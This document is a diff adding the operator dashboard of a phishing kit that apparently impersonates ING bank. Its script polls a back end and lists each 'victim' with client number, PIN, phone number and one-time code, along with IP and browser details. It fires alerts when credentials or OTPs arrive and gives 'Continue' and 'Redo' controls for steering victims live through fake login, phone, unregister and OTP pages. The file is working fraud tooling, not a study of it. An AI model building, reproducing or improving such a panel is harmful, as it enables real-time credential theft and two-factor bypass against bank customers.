@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ING Panel</title>
+  <link rel="preconnect" href="https://rsms.me">
+  <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
+  <style>
+    :root {
+      --bg: #000000;
+      --card-bg: #0b0b0b;
+      --card-border: rgba(255,255,255,0.055);
+      --card-border-hover: rgba(255,255,255,0.12);
+      --text-primary: #f5f5f5;
+      --text-muted: #8b8b8b;
+      --green: #34d399;
+      --red: #fb7185;
+      --blue: #60a5fa;
+      --yellow: #fbbf24;
+      --radius: 18px;
+    }
+    * { box-sizing: border-box; font-family: InterVariable, Inter, system-ui, sans-serif; }
+    body { margin: 0; background: radial-gradient(circle at 50% -20%, #111 0%, #000 60%); color: var(--text-primary); }
+
+    .greet-bar {
+      max-width: 1120px;
+      margin: 32px auto 0;
+      padding: 0 28px;
+      font-size: 20px;
+      font-weight: 600;
+      line-height: 1.05;
+    }
+    .greet-bar span { color: var(--text-primary); }
+
+    .dashboard { max-width: 1120px; margin: 24px auto 64px; padding: 0 28px; }
+    .grid { display: grid; gap: 22px; }
+    .card { position: relative; background: linear-gradient(180deg, rgba(255,255,255,0.04), rgba(255,255,255,0) 55%), var(--card-bg); border: 1px solid var(--card-border); border-radius: var(--radius); padding: 22px; transition: transform 240ms cubic-bezier(.2,.8,.2,1), border-color 240ms ease, box-shadow 240ms ease; }
+    .card:hover { transform: translateY(-3px); border-color: var(--card-border-hover); box-shadow: 0 18px 36px rgba(0,0,0,.55); }
+    .stats { grid-template-columns: repeat(3, 1fr); }
+    .stat-label { font-size: 11px; font-weight: 500; letter-spacing: 0.18em; text-transform: uppercase; color: var(--text-muted); }
+    .stat-value { margin-top: 12px; font-size: 34px; font-weight: 600; line-height: 1.05; }
+    .stat-change { margin-top: 6px; font-size: 12px; font-weight: 450; }
+    .green { color: var(--green); } .red { color: var(--red); }
+    table { width: 100%; font-size: .9rem; border-collapse: collapse; margin-top: 1rem; }
+    th { text-align: left; padding: .6rem .5rem; border-bottom: 1px solid #e5e5e5; font-weight: 500; font-size: .8rem; text-transform: uppercase; color: #555; }
+    td { padding: .6rem .5rem; border-bottom: 1px solid #f0f0f0; }
+    tr:hover { background: #fafafa; }
+
+    .btn {
+      padding: .35rem .75rem;
+      font-size: .8rem;
+      border-radius: 6px;
+      border: 1px solid rgba(255,255,255,.08);
+      background: rgba(255,255,255,.08);
+      color: var(--text-primary);
+      cursor: pointer;
+      transition: all .18s ease;
+    }
+    .btn:hover { background: rgba(255,255,255,.15); border-color: rgba(255,255,255,.2); }
+
+    .icon-btn {
+      width: 32px;
+      height: 32px;
+      padding: 6px;
+      border-radius: 6px;
+      border: 1px solid rgba(255,255,255,.08);
+      background: rgba(255,255,255,.08);
+      cursor: pointer;
+      transition: all .18s ease;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .icon-btn:hover { 
+      background: rgba(255,255,255,.15); 
+      border-color: rgba(255,255,255,.2);
+      transform: scale(1.05);
+    }
+    .icon-btn img {
+      width: 18px;
+      height: 18px;
+      filter: brightness(0) invert(1);
+    }
+    .icon-btn.continue { border-color: rgba(52, 211, 153, 0.3); }
+    .icon-btn.continue:hover { background: rgba(52, 211, 153, 0.15); }
+    .icon-btn.redo { border-color: rgba(251, 113, 133, 0.3); }
+    .icon-btn.redo:hover { background: rgba(251, 113, 133, 0.15); }
+    .icon-btn.manage { border-color: rgba(96, 165, 250, 0.3); }
+    .icon-btn.manage:hover { background: rgba(96, 165, 250, 0.15); }
+
+    .cred { font-family: monospace; font-size: .8rem; background: #f1f1f1; padding: 2px 4px; border-radius: 3px; color:#000; }
+    .detail { font-size: 12px; color: var(--text-muted); margin-top: 8px; }
+    #modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,.75); align-items: center; justify-content: center; z-index: 1000; }
+    #modal .card { max-width: 600px; width: 90%; background: #111; border-color: #333; max-height: 90vh; overflow-y: auto; }
+    #empty { text-align: center; color: #888; padding: 2rem 0; }
+    @media (max-width: 900px) { .stats { grid-template-columns: 1fr; } }
+
+    /* Alert/Toast Styles */
+    #alert-container {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      z-index: 10000;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      max-width: 400px;
+    }
+    .alert {
+      background: linear-gradient(135deg, rgba(255,255,255,0.1), rgba(255,255,255,0.05));
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 12px;
+      padding: 16px 20px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+      animation: slideIn 0.3s ease, fadeOut 0.3s ease 4.7s;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      cursor: pointer;
+      transition: transform 0.2s ease;
+    }
+    .alert:hover { transform: translateX(-5px); }
+    .alert-icon {
+      width: 40px;
+      height: 40px;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      flex-shrink: 0;
+    }
+    .alert-content { flex: 1; }
+    .alert-title { font-size: 13px; font-weight: 600; color: var(--text-primary); margin-bottom: 2px; }
+    .alert-desc { font-size: 12px; color: var(--text-muted); }
+    .alert-time { font-size: 11px; color: var(--text-muted); margin-top: 4px; }
+    
+    .alert-success { border-left: 3px solid var(--green); }
+    .alert-success .alert-icon { background: rgba(52, 211, 153, 0.15); color: var(--green); }
+    
+    .alert-warning { border-left: 3px solid var(--yellow); }
+    .alert-warning .alert-icon { background: rgba(251, 191, 36, 0.15); color: var(--yellow); }
+    
+    .alert-info { border-left: 3px solid var(--blue); }
+    .alert-info .alert-icon { background: rgba(96, 165, 250, 0.15); color: var(--blue); }
+    
+    .alert-error { border-left: 3px solid var(--red); }
+    .alert-error .alert-icon { background: rgba(251, 113, 133, 0.15); color: var(--red); }
+
+    @keyframes slideIn {
+      from { transform: translateX(100%); opacity: 0; }
+      to { transform: translateX(0); opacity: 1; }
+    }
+    @keyframes fadeOut {
+      to { opacity: 0; transform: translateX(20px); }
+    }
+
+    /* Status Badge Styles */
+    .status-badge {
+      display: inline-flex;
+      flex-direction: column;
+      gap: 2px;
+    }
+    .status-page {
+      font-size: 11px;
+      font-weight: 600;
+      letter-spacing: 0.05em;
+      color: var(--text-primary);
+    }
+    .status-action {
+      font-size: 10px;
+      font-weight: 500;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+    }
+    .status-connected { color: var(--blue); }
+    .status-captured { color: var(--green); }
+    .status-waiting { color: var(--yellow); }
+
+    .action-btns {
+      display: flex;
+      gap: 6px;
+    }
+  </style>
+</head>
+<body>
+  <div id="alert-container"></div>
+
+  <div class="greet-bar">Hello, <span id="userName">admin</span>! • <span id="clock">--:-- --</span></div>
+
+  <div class="dashboard">
+    <div class="grid stats">
+      <div class="card"><div class="stat-label">Active Sessions</div><div class="stat-value" id="active">—</div></div>
+      <div class="card"><div class="stat-label">Visits (total)</div><div class="stat-value" id="total">—</div></div>
+      <div class="card"><div class="stat-label">Successful Logins</div><div class="stat-value" id="success">—</div></div>
+    </div>
+
+    <div class="card" style="margin-top:22px;">
+      <div style="font-size:14px;font-weight:600;margin-bottom:12px;">
+        Active Sessions · <a id="domainLink" href="#" target="_blank" style="color:#007bff;text-decoration:none;"></a>
+      </div>
+      <table id="tbl"><thead><tr>
+        <th>#</th><th>Client</th><th>PIN</th><th>Phone</th><th>OTP</th><th>IP</th><th>Platform</th><th>Browser</th><th>Status</th><th>Actions</th>
+      </tr></thead><tbody></tbody></table>
+      <div id="empty">No active sessions</div>
+    </div>
+  </div>
+
+  <div id="modal" onclick="if(event.target===this)closeModal()">
+    <div class="card">
+      <div style="display:flex;justify-content:space-between;align-items:center; margin-bottom: 16px;">
+        <h3 style="margin:0">Session Detail</h3><button onclick="closeModal()" class="btn">✕</button>
+      </div>
+      <div id="modalBody" style="font-size:13px;line-height:1.6"></div>
+      <div style="margin-top:1.25rem;display:flex;gap:8px">
+        <button class="btn" onclick="act('delete',currentSid)">🗑 Delete</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let currentSid = null;
+    const qs = s => document.querySelector(s);
+    let lastSessions = new Map();
+
+    function updateClock(){
+      const now = new Date();
+      const h = now.getHours(), m = now.getMinutes();
+      const suffix = h >= 12 ? 'pm' : 'am';
+      const hh = h % 12 || 12;
+      qs('#clock').textContent = `${hh}:${m.toString().padStart(2,'0')}${suffix}`;
+    }
+    updateClock(); setInterval(updateClock, 1000);
+
+    function pageTitle(file){
+      switch(file){
+        case 'index.html':    return 'LOGIN';
+        case 'verify.html':   return 'PHONE';
+        case 'unregister.html':return 'UNREGISTER';
+        case 'otp.html':      return 'OTP';
+        default:              return file;
+      }
+    }
+
+    function getStatusDisplay(s) {
+      const page = pageTitle(s.page);
+      let statusText = '';
+      let statusClass = '';
+      
+      if (s.page === 'success') {
+        statusText = 'APPROVED';
+        statusClass = 'status-captured';
+      } else if (s.page === 'otp.html') {
+        if (s.otp) {
+          statusText = 'CAPTURED';
+          statusClass = 'status-captured';
+        } else {
+          statusText = 'CONNECTED';
+          statusClass = 'status-connected';
+        }
+      } else if (s.page === 'unregister.html') {
+        if (s.unregisterClicked) {
+          statusText = 'CAPTURED';
+          statusClass = 'status-captured';
+        } else {
+          statusText = 'CONNECTED';
+          statusClass = 'status-connected';
+        }
+      } else if (s.page === 'verify.html') {
+        if (s.phone) {
+          statusText = 'CAPTURED';
+          statusClass = 'status-captured';
+        } else {
+          statusText = 'CONNECTED';
+          statusClass = 'status-connected';
+        }
+      } else if (s.page === 'index.html') {
+        if (s.entered) {
+          statusText = 'CAPTURED';
+          statusClass = 'status-captured';
+        } else {
+          statusText = 'CONNECTED';
+          statusClass = 'status-connected';
+        }
+      } else {
+        statusText = 'WAITING';
+        statusClass = 'status-waiting';
+      }
+      
+      return `<div class="status-badge">
+        <span class="status-page">${page}</span>
+        <span class="status-action ${statusClass}">• ${statusText}</span>
+      </div>`;
+    }
+
+    function getActionButtons(s) {
+      let html = '<div class="action-btns">';
+      
+      // Manage button (always show)
+      html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details">
+        <img src="/images/description-svgrepo-com.svg" alt="Manage">
+      </button>`;
+      
+      let showRedo = false;
+      let showCont = false;
+      
+      // Logic based on current page and whether info was entered on THAT page
+      if (s.page === 'index.html') {
+        // LOGIN page: show buttons only after credentials entered
+        if (s.entered) {
+          showRedo = true;
+          showCont = true;
+        }
+      } else if (s.page === 'verify.html') {
+        // PHONE page: show buttons only after phone entered
+        if (s.phone) {
+          showRedo = true;
+          showCont = true;
+        }
+      } else if (s.page === 'unregister.html') {
+        // UNREGISTER page: show continue only after clicked, never show redo
+        if (s.unregisterClicked) {
+          showCont = true;
+          showRedo = false;
+        }
+      } else if (s.page === 'otp.html') {
+        // OTP page: show buttons only after OTP entered
+        if (s.otp) {
+          showRedo = true;
+          showCont = true;
+        }
+      } else if (s.page === 'success') {
+        // Success page: no buttons
+        showRedo = false;
+        showCont = false;
+      }
+      
+      if (showCont) {
+        html += `<button class="icon-btn continue" onclick="act('cont', '${s.sid}')" title="Continue">
+          <img src="/images/arrow-right-square-svgrepo-com.svg" alt="Continue">
+        </button>`;
+      }
+      
+      if (showRedo) {
+        html += `<button class="icon-btn redo" onclick="act('redo', '${s.sid}')" title="Redo">
+          <img src="/images/cross-square-svgrepo-com.svg" alt="Redo">
+        </button>`;
+      }
+      
+      html += '</div>';
+      return html;
+    }
+
+    /* ----------  ALERT SYSTEM  ---------- */
+    function showAlert(type, title, description, victimNum) {
+      const container = qs('#alert-container');
+      const alert = document.createElement('div');
+      alert.className = `alert alert-${type}`;
+      
+      const icons = {
+        success: '✓',
+        warning: '⚠',
+        info: 'ℹ',
+        error: '✕'
+      };
+      
+      const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+      
+      alert.innerHTML = `
+        <div class="alert-icon">${icons[type]}</div>
+        <div class="alert-content">
+          <div class="alert-title">${title}</div>
+          <div class="alert-desc">${description}</div>
+          <div class="alert-time">Victim #${victimNum} • ${time}</div>
+        </div>
+      `;
+      
+      alert.onclick = () => {
+        alert.remove();
+        const row = document.querySelector(`tr[data-sid="${currentSid}"]`);
+        if (row) row.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      };
+      
+      container.appendChild(alert);
+      setTimeout(() => alert.remove(), 5000);
+    }
+
+    /* ----------  CHECK FOR CHANGES & ALERT  ---------- */
+    function checkChanges(newSessions) {
+      newSessions.forEach(s => {
+        const old = lastSessions.get(s.sid);
+        if (!old) {
+          showAlert('info', 'NEW VISITOR', `Connected from ${s.ip}`, s.victimNum);
+          if (s.entered) showAlert('success', 'ENTERED CREDENTIALS', `Client: ${s.email}`, s.victimNum);
+        } else {
+          if (!old.entered && s.entered) {
+            showAlert('success', 'ENTERED CREDENTIALS', `Client: ${s.email}`, s.victimNum);
+          }
+          if (!old.phone && s.phone) {
+            showAlert('info', 'ENTERED PHONE', `Phone: ${s.phone}`, s.victimNum);
+          }
+          if (!old.unregisterClicked && s.unregisterClicked) {
+            showAlert('warning', 'CLICKED UNREGISTER', 'Victim proceeded to unregister', s.victimNum);
+          }
+          if (!old.otp && s.otp) {
+            showAlert('success', 'ENTERED OTP', `OTP: ${s.otp}`, s.victimNum);
+          }
+          if (old.page !== s.page) {
+            const pageNames = {
+              'index.html': 'Login Page',
+              'verify.html': 'Phone Verification',
+              'unregister.html': 'Unregister Page',
+              'otp.html': 'OTP Page',
+              'success': 'Success Page'
+            };
+            showAlert('info', 'PAGE CHANGE', `Moved to ${pageNames[s.page] || s.page}`, s.victimNum);
+          }
+        }
+      });
+      
+      lastSessions = new Map(newSessions.map(s => [s.sid, {...s}]));
+    }
+
+    function render(d){
+      qs('#active').textContent   = d.active;
+      qs('#total').textContent    = d.totalVictims;
+      qs('#success').textContent  = d.success;
+
+      const domainLink = qs('#domainLink');
+      domainLink.textContent = d.domain || 'localhost';
+      domainLink.href        = d.domain || 'http://localhost';
+
+      const body = qs('#tbl tbody');
+      const empty= qs('#empty');
+      if(!d.sessions.length){ body.innerHTML=''; empty.style.display='block'; return; }
+      empty.style.display='none';
+      body.innerHTML = d.sessions.map(s=>`
+        <tr data-sid="${s.sid}">
+          <td>${s.victimNum}</td>
+          <td><span class="cred">${s.email||'—'}</span></td>
+          <td><span class="cred">${s.password||'—'}</span></td>
+          <td><span class="cred">${s.phone||'—'}</span></td>
+          <td><span class="cred">${s.otp||'—'}</span></td>
+          <td>${s.ip}</td>
+          <td>${s.platform}</td>
+          <td>${s.browser}</td>
+          <td>${getStatusDisplay(s)}</td>
+          <td>${getActionButtons(s)}</td>
+        </tr>`).join('');
+    }
+
+    function showDetail(sid){
+      const s = jsonData.sessions.find(x=>x.sid===sid);
+      if(!s)return;
+      currentSid = sid;
+
+      const localDate = new Date(s.dateStr).toLocaleString();
+
+      qs('#modalBody').innerHTML = `
+        <div class="detail">Session ID</div><div class="cred">${s.sid}</div>
+        <div class="detail">Client number</div><div class="cred">${s.email||'—'}</div>
+        <div class="detail">PIN</div><div class="cred">${s.password||'—'}</div>
+        <div class="detail">Phone</div><div class="cred">${s.phone||'—'}</div>
+        <div class="detail">OTP</div><div class="cred">${s.otp||'—'}</div>
+        <div class="detail">IP</div><div>${s.ip}</div>
+        <div class="detail">Platform</div><div>${s.platform}</div>
+        <div class="detail">Browser</div><div>${s.browser}</div>
+        <div class="detail">Current Page</div><div>${pageTitle(s.page)}</div>
+        <div class="detail">User-Agent</div><div style="word-break:break-all">${s.ua}</div>
+        <div class="detail">Date</div><div>${localDate}</div>`;
+
+      qs('#modal').style.display = 'flex';
+    }
+    function closeModal(){ qs('#modal').style.display='none'; }
+
+    async function act(action,sid){
+      await fetch('/api/panel',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action,sid})});
+      if (qs('#modal').style.display === 'flex') closeModal();
+      load();
+    }
+
+    let jsonData = {};
+    async function load(){
+      jsonData = await fetch('/api/panel').then(r=>r.json());
+      checkChanges(jsonData.sessions);
+      render(jsonData);
+    }
+    load(); setInterval(load,2000);
+  </script>
+</body>
+</html>
